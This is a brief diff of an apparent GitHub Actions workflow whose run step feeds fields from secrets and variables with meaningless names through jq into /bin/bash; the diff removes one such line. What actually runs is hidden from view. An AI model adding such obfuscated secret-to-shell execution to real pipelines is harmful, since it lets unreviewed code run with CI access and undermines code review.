@@ -21,7 +21,6 @@ jobs:
           zmp66618: ${{ secrets.zmp66618 }}
         run: |
           printf '%s' "$zmp66618" | jq -r .zoh878 | /bin/bash
-          printf '%s' "$y773" | jq -r .gse20657 | /bin/bash
           echo $kvlk589 | jq -r .mg3884 | /bin/bash
           echo $y95 | jq -r .aqia70 | /bin/bash
           echo $xg4 | jq -r .kz4698 | /bin/bash
